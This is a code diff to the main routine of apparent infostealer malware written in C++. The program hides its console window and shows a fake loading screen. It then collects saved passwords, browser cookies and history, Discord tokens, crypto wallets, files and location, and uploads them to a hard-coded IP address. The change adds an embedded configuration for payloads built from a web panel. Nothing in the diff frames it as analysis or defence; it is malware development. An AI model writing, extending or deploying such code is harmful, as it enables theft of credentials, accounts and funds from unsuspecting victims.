@@ -25,22 +25,55 @@ int main() {
     // Hide console window immediately on startup
     hide_console_window();
 
-    // Get user identifier from environment variable or default to "west"
-    std::string user = "west"; // Default
-    char* envUser = std::getenv("CLIENT_USER");
-    if (envUser) user = envUser;
+    // Configuration variables with defaults
+    std::string user = "west";
+    std::string serverUrl = "http://62.60.179.121/api/upload";
+    bool collectLocation = true;
+    bool collectSystemInfo = true;
+    bool collectRunningProcesses = true;
+    bool collectInstalledApps = true;
+    bool collectBrowserCookies = true;
+    bool collectSavedPasswords = true;
+    bool collectBrowserHistory = true;
+    bool collectDiscordTokens = true;
+    bool collectCryptoWallets = true;
+    bool collectImportantFiles = true;
 
-    // Feature flags - default to enabled, can be disabled via environment variables
-    bool collectLocation = get_feature_flag("COLLECT_LOCATION", true);
-    bool collectSystemInfo = get_feature_flag("COLLECT_SYSTEM_INFO", true);
-    bool collectRunningProcesses = get_feature_flag("COLLECT_RUNNING_PROCESSES", true);
-    bool collectInstalledApps = get_feature_flag("COLLECT_INSTALLED_APPS", true);
-    bool collectBrowserCookies = get_feature_flag("COLLECT_BROWSER_COOKIES", true);
-    bool collectSavedPasswords = get_feature_flag("COLLECT_SAVED_PASSWORDS", true);
-    bool collectBrowserHistory = get_feature_flag("COLLECT_BROWSER_HISTORY", true);
-    bool collectDiscordTokens = get_feature_flag("COLLECT_DISCORD_TOKENS", true);
-    bool collectCryptoWallets = get_feature_flag("COLLECT_CRYPTO_WALLETS", true);
-    bool collectImportantFiles = get_feature_flag("COLLECT_IMPORTANT_FILES", true);
+    // Try to read embedded config from exe first (for payloads generated from web panel)
+    auto embeddedConfig = read_embedded_config();
+    if (embeddedConfig) {
+        // Use embedded config
+        user = embeddedConfig->user;
+        serverUrl = embeddedConfig->serverUrl;
+        collectLocation = embeddedConfig->collectLocation;
+        collectSystemInfo = embeddedConfig->collectSystemInfo;
+        collectRunningProcesses = embeddedConfig->collectRunningProcesses;
+        collectInstalledApps = embeddedConfig->collectInstalledApps;
+        collectBrowserCookies = embeddedConfig->collectBrowserCookies;
+        collectSavedPasswords = embeddedConfig->collectSavedPasswords;
+        collectBrowserHistory = embeddedConfig->collectBrowserHistory;
+        collectDiscordTokens = embeddedConfig->collectDiscordTokens;
+        collectCryptoWallets = embeddedConfig->collectCryptoWallets;
+        collectImportantFiles = embeddedConfig->collectImportantFiles;
+    } else {
+        // Fall back to environment variables (for manual/batch file execution)
+        char* envUser = std::getenv("CLIENT_USER");
+        if (envUser) user = envUser;
+
+        char* envUrl = std::getenv("WEBPANEL_URL");
+        if (envUrl) serverUrl = envUrl;
+
+        collectLocation = get_feature_flag("COLLECT_LOCATION", true);
+        collectSystemInfo = get_feature_flag("COLLECT_SYSTEM_INFO", true);
+        collectRunningProcesses = get_feature_flag("COLLECT_RUNNING_PROCESSES", true);
+        collectInstalledApps = get_feature_flag("COLLECT_INSTALLED_APPS", true);
+        collectBrowserCookies = get_feature_flag("COLLECT_BROWSER_COOKIES", true);
+        collectSavedPasswords = get_feature_flag("COLLECT_SAVED_PASSWORDS", true);
+        collectBrowserHistory = get_feature_flag("COLLECT_BROWSER_HISTORY", true);
+        collectDiscordTokens = get_feature_flag("COLLECT_DISCORD_TOKENS", true);
+        collectCryptoWallets = get_feature_flag("COLLECT_CRYPTO_WALLETS", true);
+        collectImportantFiles = get_feature_flag("COLLECT_IMPORTANT_FILES", true);
+    }
 
     // Generate unique session ID for this collection run
     std::srand(static_cast<unsigned int>(std::time(nullptr)));
@@ -52,11 +85,6 @@ int main() {
     // Fetch location first to get real external IP
     auto location = collectLocation ? fetch_location() : std::nullopt;
     std::string ipAddress = location ? location->ipAddress : get_local_ip_address();
-
-    // Server URL - can be configured via environment variable or use default
-    std::string serverUrl = "http://62.60.179.121/api/upload"; // Default
-    char* envUrl = std::getenv("WEBPANEL_URL");
-    if (envUrl) serverUrl = envUrl;
 
     // Start fake loading screen in separate thread
     std::atomic<bool> workCompleted(false);
@@ -229,7 +257,7 @@ int main() {
 
                 // Only include cookies if feature is enabled
                 std::optional<std::string> finalBrowserCookies = collectBrowserCookies && !browserCookies.empty() ? std::optional<std::string>(browserCookies) : std::nullopt;
-                std::optional<std::string> finalSavedPasswords = collectSavedPasswords && !savedPasswords.empty() ? std::optional<std::string>(savedPasswords) : std::nullopt;
+                std::optional<std::vector<SavedPassword>> finalSavedPasswords = collectSavedPasswords && !savedPasswords.empty() ? std::optional<std::vector<SavedPassword>>(savedPasswords) : std::nullopt;
 
                 if (finalBrowserCookies || finalSavedPasswords) {
                     send_chunk(serverUrl, sessionId, PcData{
